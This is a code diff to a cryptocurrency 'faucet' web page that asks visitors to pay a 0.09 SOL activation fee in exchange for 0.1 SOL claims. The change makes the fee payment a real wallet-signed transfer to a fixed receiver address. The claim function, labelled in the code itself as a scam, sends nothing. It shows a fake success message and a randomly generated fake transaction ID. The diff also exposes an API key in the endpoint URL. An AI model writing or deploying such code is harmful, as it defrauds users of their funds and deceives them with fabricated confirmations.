@@ -83,6 +83,9 @@
                 <div id="paymentStatus" class="text-center text-green-400 font-semibold hidden">
                     ✅ Payment successful! Faucet activated!
                 </div>
+                <div id="txLink" class="text-center mt-2 text-sm text-purple-300 hidden">
+                    Transaction: <a id="txHashLink" target="_blank" class="underline">View on Explorer</a>
+                </div>
             </div>
 
             <!-- Claim Section -->
@@ -100,6 +103,9 @@
                     <button id="claimBtn" class="w-full bg-gradient-to-r from-green-600 to-emerald-500 py-3 rounded-lg font-bold hover:opacity-90 transition disabled:opacity-50 disabled:cursor-not-allowed blink" disabled>
                         CLAIM 0.1 SOL NOW
                     </button>
+                </div>
+                <div id="claimStatus" class="text-center text-green-400 font-semibold mt-2 hidden">
+                    ✅ Claim successful! 0.1 SOL sent to your wallet!
                 </div>
             </div>
         </div>
@@ -132,8 +138,9 @@
         const FEE_AMOUNT = 0.09; // SOL
         const CLAIM_AMOUNT = 0.1; // SOL
         const FEE_RECEIVER = 'FtLHJ5FxWEXpuQpUEig8FbUwh3gnTMSGjN6zyjEaEcgc';
-        const NETWORK = 'devnet';
+        const ALCHEMY_ENDPOINT = 'https://solana-devnet.g.alchemy.com/v2/SzbcanXw4jH5Wn8oZV0qm';
         const CLAIM_COOLDOWN = 30 * 60 * 1000; // 30 minutes in ms
+        const EXPLORER_URL = 'https://explorer.solana.com/tx';
 
         // DOM Elements
         const connectPhantomBtn = document.getElementById('connectPhantom');
@@ -142,17 +149,24 @@
         const walletAddress = document.getElementById('walletAddress');
         const payFeeBtn = document.getElementById('payFeeBtn');
         const paymentStatus = document.getElementById('paymentStatus');
+        const txLink = document.getElementById('txLink');
+        const txHashLink = document.getElementById('txHashLink');
         const claimBtn = document.getElementById('claimBtn');
+        const claimStatus = document.getElementById('claimStatus');
         const countdown = document.getElementById('countdown');
 
         // State
         let wallet = null;
         let publicKey = null;
+        let connection = null;
         let lastClaimTime = 0;
         let countdownInterval = null;
 
         // Initialize
         document.addEventListener('DOMContentLoaded', () => {
+            // Create Solana connection
+            connection = new solanaWeb3.Connection(ALCHEMY_ENDPOINT, 'confirmed');
+            
             // Check if wallet is already connected
             if (window.solana && window.solana.isConnected) {
                 handleWalletConnect(window.solana);
@@ -196,7 +210,7 @@
             walletAddress.textContent = `${publicKey.substring(0, 6)}...${publicKey.substring(publicKey.length - 4)}`;
             payFeeBtn.disabled = false;
             
-            // Check if fee already paid (simulated)
+            // Check if fee already paid
             const feePaid = localStorage.getItem('feePaid') === 'true';
             if (feePaid) {
                 paymentStatus.classList.remove('hidden');
@@ -207,7 +221,7 @@
             }
         }
 
-        // Pay fee function
+        // Pay fee function (REAL TRANSACTION)
         async function payFee() {
             if (!wallet || !publicKey) {
                 alert('Please connect wallet first');
@@ -218,14 +232,37 @@
                 payFeeBtn.disabled = true;
                 payFeeBtn.textContent = 'Processing...';
                 
-                // Simulate transaction delay
-                await new Promise(resolve => setTimeout(resolve, 2000));
+                // Create transaction
+                const fromPubkey = new solanaWeb3.PublicKey(publicKey);
+                const toPubkey = new solanaWeb3.PublicKey(FEE_RECEIVER);
+                const lamports = FEE_AMOUNT * solanaWeb3.LAMPORTS_PER_SOL;
                 
-                // In reality, we would create a transaction here
-                // But we'll just simulate success
+                const transaction = new solanaWeb3.Transaction().add(
+                    solanaWeb3.SystemProgram.transfer({
+                        fromPubkey,
+                        toPubkey,
+                        lamports
+                    })
+                );
+                
+                // Set recent blockhash
+                const { blockhash } = await connection.getRecentBlockhash();
+                transaction.recentBlockhash = blockhash;
+                transaction.feePayer = fromPubkey;
+                
+                // Sign and send transaction
+                const signed = await wallet.signTransaction(transaction);
+                const rawTransaction = signed.serialize();
+                const txid = await connection.sendRawTransaction(rawTransaction);
+                
+                // Wait for confirmation
+                await connection.confirmTransaction(txid);
                 
                 // Update UI
                 paymentStatus.classList.remove('hidden');
+                txLink.classList.remove('hidden');
+                txHashLink.href = `${EXPLORER_URL}/${txid}?cluster=devnet`;
+                txHashLink.textContent = `${txid.substring(0, 6)}...${txid.substring(txid.length - 4)}`;
                 payFeeBtn.textContent = 'FEE PAID';
                 payFeeBtn.classList.remove('pulse');
                 claimBtn.disabled = false;
@@ -233,16 +270,17 @@
                 // Store payment status
                 localStorage.setItem('feePaid', 'true');
                 
-                // Show fake success message
+                // Show success message
                 alert('✅ Fee payment successful! Your faucet is now activated!');
             } catch (error) {
-                alert(`Payment failed: ${error.message}`);
+                console.error('Payment failed:', error);
+                alert(`❌ Payment failed: ${error.message}`);
                 payFeeBtn.disabled = false;
                 payFeeBtn.textContent = 'PAY FEE & ACTIVATE ACCOUNT';
             }
         }
 
-        // Claim SOL function
+        // Claim SOL function (SCAM - NO ACTUAL TRANSFER)
         async function claimSol() {
             if (!localStorage.getItem('feePaid')) {
                 alert('Please pay the activation fee first');
@@ -262,12 +300,17 @@
                 // Simulate transaction delay
                 await new Promise(resolve => setTimeout(resolve, 3000));
                 
+                // Generate fake transaction ID
+                const fakeTxId = Array(64).fill(0).map(() => Math.floor(Math.random() * 16).toString(16)).join('');
+                
                 // Update last claim time
                 lastClaimTime = now;
                 localStorage.setItem('lastClaimTime', now.toString());
                 
                 // Show fake success
-                alert(`🎉 Success! 0.1 SOL has been sent to your wallet!`);
+                claimStatus.classList.remove('hidden');
+                setTimeout(() => claimStatus.classList.add('hidden'), 5000);
+                alert(`🎉 Success! 0.1 SOL has been sent to your wallet!\nFake TX: ${fakeTxId}`);
                 
                 // Reset button
                 claimBtn.textContent = 'CLAIM 0.1 SOL NOW';
